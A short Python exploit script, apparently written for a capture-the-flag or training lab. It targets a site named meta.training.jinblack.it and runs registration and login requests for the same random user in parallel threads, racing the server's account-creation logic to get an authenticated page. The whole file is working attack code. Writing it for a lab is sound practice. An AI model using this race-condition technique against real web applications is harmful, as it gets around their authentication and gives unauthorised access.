import requests
import threading
import random
import string

baseurl="http://meta.training.jinblack.it/"

def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))
        
def login(session,username,password, log_user):
    url="%s/login.php" % baseurl
    data={"username": username, "password": password, "log_user": log_user}
    r=session.post(url, data=data)
    #print(r.text)
    url1 = "http://meta.training.jinblack.it/"
    try:
        response = session.get(url1)
        response.raise_for_status()  # Solleva un'eccezione se c'è un problema con la richiesta HTTP
        print('avvenuta con successo')
    # Stampa il contenuto della risorsa
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante la richiesta HTTP: {e}")
    return r.text

def registration(session, username, password1, password2, reg_user):
    url="%s/register.php" % baseurl
    data={"username": username, "password_1": password1, "password_2": password2, "reg_user": reg_user}
    r=session.post(url, data=data)
    #print(r.text)
    return r.text

s = requests.Session() #  to create session
u=randomString()
p1="x"
p2="x"
r=1
l=1

t1=threading.Thread(target=registration, args=(s,u,p1,p2,r))
t2=threading.Thread(target=login, args=(s,u,p1, l))
t1.start()
t2.start()


t1.join()
t2.join()

   

